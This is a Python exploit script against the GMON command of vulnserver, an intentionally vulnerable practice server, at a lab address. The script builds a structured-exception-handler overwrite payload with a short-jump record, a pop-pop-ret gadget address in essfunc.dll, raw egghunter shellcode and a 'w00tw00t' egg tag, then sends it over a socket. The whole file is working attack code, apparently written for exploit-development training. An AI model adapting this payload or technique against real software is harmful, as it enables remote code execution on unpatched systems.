#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM, error, timeout
from sys import exit
from struct import pack

rhost = "192.168.41.128"
rport = 9999
target = (rhost, rport)
target_length = 5000


def validate_payload_length(current_length, expected_length):
    if current_length != expected_length:
        print(
            (
                "[!] Payload was length {current_length}. "
                "Expected: {expected_length}"
            ).format(current_length=current_length, expected_length=expected_length)
        )
        exit(1)


payload = ""
payload += "GMON "
payload += "/.:/"

# Message=    SEH record (nseh field) at 0x00b7ffdc overwritten with normal pattern : 0x45356d45 (offset 3495), followed by 28 bytes of cyclic data after the handler
nseh = "\x71\x80\x70\x80"
# Message=  0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0- (\\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll)
seh = pack("<L", 0x6250172b)
egghunter = (
    "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
payload += "\x90" * 20
payload += "w00tw00t"
payload += "\xCC" * (3495 - 128 - 28)
payload += "\x90" * 64
payload += egghunter
payload += "\x90" * (64 - len(egghunter))
payload += nseh
payload += seh
payload += "D" * (4989 - 8 - 3495)
payload += "\r\n"

if __name__ == "__main__":
    validate_payload_length(current_length=len(payload), expected_length=target_length)
    print("[*] Connecting to target")
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect(target)
    except timeout:
        print("[!] Timed out connecting to the service. Is it paused in the debugger?")
        exit(1)
    except error:
        print("[!] Failed to connect to remote service, is it running?")
        exit(1)
    print("[*] Checking for welcome message")
    try:
        welcome = s.recv(1024)
    except timeout:
        print(
            (
                "[!] Timed out waiting for the welcome message. "
                "Is it paused in the debugger?"
            )
        )
        exit(1)
    except error:
        print("[!] Failed to receive welcome message. Uh oh...")
        exit(1)
    print("[*] Welcome message received")
    print("\t" + welcome.rstrip())
    print("[*] Sending payload")
    s.send(payload)
    print("B00M! ph33r")
